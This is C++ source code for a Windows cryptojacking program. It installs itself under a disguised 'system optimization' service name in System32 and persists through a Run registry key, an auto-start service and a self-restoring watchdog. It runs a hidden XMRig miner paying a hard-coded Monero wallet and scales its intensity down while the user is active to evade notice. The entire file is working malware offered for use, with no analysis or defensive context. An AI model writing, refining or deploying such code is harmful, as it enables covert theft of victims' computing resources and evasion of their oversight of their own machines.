#include <windows.h>
#include <string>
#include <thread>
#include <random>
#include <filesystem>
#include <iostream>
#include <fstream>

// Define constants
const std::wstring SERVICE_NAME = L"WinCoreSysOpt";
const std::wstring INSTALL_PATH = L"C:\\Windows\\System32\\WinCore\\wincore.exe";
const std::wstring BACKUP_PATH = L"C:\\Windows\\System32\\WinCore\\backup\\wincore_bak.exe";
const std::wstring XMRIG_PATH = L"C:\\Windows\\System32\\WinCore\\xmrig.exe";
const std::string WALLET_ADDRESS = "44SeM4ZHNCxMpjmQYowJa17gRS87pdiqM82FwyKLQuY2NMuq11ZqYzxPfMNf7PZTNYYQLGfiaxkA2QgEPLEHLdsXLCWN2Sn";
const int IDLE_THRESHOLD = 10000; // 10 seconds idle time
const int LOW_USAGE = 1; // 1% CPU/GPU when user active
const int HIGH_USAGE = 90; // 90% CPU/GPU when idle

// Global variables for service and miner control
SERVICE_STATUS_HANDLE g_StatusHandle;
SERVICE_STATUS g_ServiceStatus = { SERVICE_WIN32_OWN_PROCESS, SERVICE_START_PENDING, 0, 0, 0, 0, 0 };
HANDLE g_MinerProcess = nullptr;

// Function to generate random string for file/process names (unchanged)
std::string generateRandomName(int length) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, chars.size() - 1);
    std::string result;
    for (int i = 0; i < length; ++i) {
        result += chars[dis(gen)];
    }
    return result;
}

// Function to log messages for debugging (NEW)
void log(const std::string& msg) {
    std::ofstream logfile("C:\\Windows\\System32\\WinCore\\log.txt", std::ios::app);
    logfile << msg << std::endl;
    logfile.close();
}

// Function to install as a Windows service (unchanged)
bool installService() {
    SC_HANDLE scm = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        log("Failed to open SC Manager");
        return false;
    }

    SC_HANDLE service = CreateService(
        scm, SERVICE_NAME.c_str(), L"WinCore Service - System Optimization Module",
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
        INSTALL_PATH.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (!service) {
        log("Failed to create service");
        CloseServiceHandle(scm);
        return false;
    }

    log("Service installed successfully");
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    return true;
}

// Function to copy executable to hidden directory (IMPROVED with error logging and XMRig placeholder)
bool setupFiles() {
    std::filesystem::create_directories(L"C:\\Windows\\System32\\WinCore\\backup");
    std::wstring exePath;
    wchar_t buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH); // Fixed nullptr to NULL for compatibility
    exePath = buffer;
    bool success = true;
    if (!CopyFile(exePath.c_str(), INSTALL_PATH.c_str(), FALSE)) {
        log("Failed to copy to INSTALL_PATH");
        success = false;
    }
    if (!CopyFile(exePath.c_str(), BACKUP_PATH.c_str(), FALSE)) {
        log("Failed to copy to BACKUP_PATH");
        success = false;
    }
    // Placeholder: Copy or extract xmrig.exe (assume it's part of distribution for now)
    // In a real setup, embed xmrig.exe as a resource or ensure it's included in distribution
    log("Setup files completed with status: " + std::to_string(success));
    return success;
}

// Function to add to registry for autostart (IMPROVED with error logging)
bool addToRegistry() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        log("Failed to open registry key");
        return false;
    }
    bool success = RegSetValueEx(hKey, L"WinCoreSys", 0, REG_SZ, (BYTE*)INSTALL_PATH.c_str(), (INSTALL_PATH.size() + 1) * sizeof(wchar_t)) == ERROR_SUCCESS;
    RegCloseKey(hKey);
    log("Registry addition status: " + std::to_string(success));
    return success;
}

// Function to monitor user activity (keyboard/mouse) (unchanged)
bool isUserActive() {
    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
    GetLastInputInfo(&lii);
    DWORD currentTick = GetTickCount();
    return (currentTick - lii.dwTime) < IDLE_THRESHOLD;
}

// Function to terminate existing miner process (NEW)
void terminateMiner() {
    if (g_MinerProcess) {
        TerminateProcess(g_MinerProcess, 0);
        CloseHandle(g_MinerProcess);
        g_MinerProcess = nullptr;
        log("Terminated existing miner process");
    }
}

// Function to adjust mining intensity (IMPROVED with actual implementation)
void adjustMiningIntensity(bool userActive) {
    terminateMiner();
    std::wstring command = userActive ?
        L"xmrig.exe --threads=1 --cpu-priority=1 -o pool.supportxmr.com:443 -u " + std::wstring(WALLET_ADDRESS.begin(), WALLET_ADDRESS.end()) + L" -p worker1 --background" :
        L"xmrig.exe --threads=auto --cpu-priority=5 -o pool.supportxmr.com:443 -u " + std::wstring(WALLET_ADDRESS.begin(), WALLET_ADDRESS.end()) + L" -p worker1 --background";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(nullptr, (LPWSTR)command.c_str(), nullptr, nullptr, FALSE, 0, nullptr, L"C:\\Windows\\System32\\WinCore", &si, &pi)) {
        g_MinerProcess = pi.hProcess;
        CloseHandle(pi.hThread);
        log("Started miner with " + std::string(userActive ? "low" : "high") + " intensity");
    } else {
        log("Failed to start miner process");
    }
}

// Function to start mining with XMRig (IMPROVED with proper wide string handling)
void startMining() {
    std::wstring command = L"xmrig.exe -o pool.supportxmr.com:443 -u " + std::wstring(WALLET_ADDRESS.begin(), WALLET_ADDRESS.end()) + L" -p worker1 --background";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(nullptr, (LPWSTR)command.c_str(), nullptr, nullptr, FALSE, 0, nullptr, L"C:\\Windows\\System32\\WinCore", &si, &pi)) {
        g_MinerProcess = pi.hProcess;
        CloseHandle(pi.hThread);
        log("Mining process started successfully");
    } else {
        log("Failed to start mining process");
    }
}

// Watchdog to ensure service is running (unchanged)
void watchdog() {
    while (true) {
        if (!std::filesystem::exists(INSTALL_PATH)) {
            CopyFile(BACKUP_PATH.c_str(), INSTALL_PATH.c_str(), FALSE);
            system("sc start WinCoreSysOpt");
            log("Restored executable from backup and attempted service restart");
        }
        Sleep(60000); // Check every minute
    }
}

// Service control handler (NEW)
VOID WINAPI ServiceControlHandler(DWORD control) {
    if (control == SERVICE_CONTROL_STOP || control == SERVICE_CONTROL_SHUTDOWN) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        terminateMiner(); // Ensure miner is stopped on service shutdown
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        log("Service stopping");
    }
}

// Service main function (IMPROVED with proper control handling)
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME.c_str(), ServiceControlHandler);
    if (!g_StatusHandle) {
        log("Failed to register service control handler");
        return;
    }

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    log("Service started");

    std::thread miner(startMining);
    std::thread watch(watchdog);
    while (g_ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        bool active = isUserActive();
        adjustMiningIntensity(active);
        Sleep(1000); // Check every second
    }
    miner.detach();
    watch.detach();
    log("Service main loop exited");
}

int main(int argc, char* argv[]) {
    // Allow test mode for debugging without service installation (NEW)
    if (argc > 1 && std::string(argv[1]) == "test") {
        log("Running in test mode");
        setupFiles();
        addToRegistry();
        startMining();
        while (true) {
            bool active = isUserActive();
            adjustMiningIntensity(active);
            Sleep(1000);
        }
    } else {
        // Install if not already installed (unchanged)
        if (!std::filesystem::exists(INSTALL_PATH)) {
            log("Installing files and service");
            setupFiles();
            addToRegistry();
            installService();
        }
        // Start as service
        SERVICE_TABLE_ENTRY DispatchTable[] = { { (LPWSTR)SERVICE_NAME.c_str(), (LPSERVICE_MAIN_FUNCTION)ServiceMain }, { nullptr, nullptr } };
        log("Starting service dispatcher");
        StartServiceCtrlDispatcher(DispatchTable);
    }
    return 0;
}


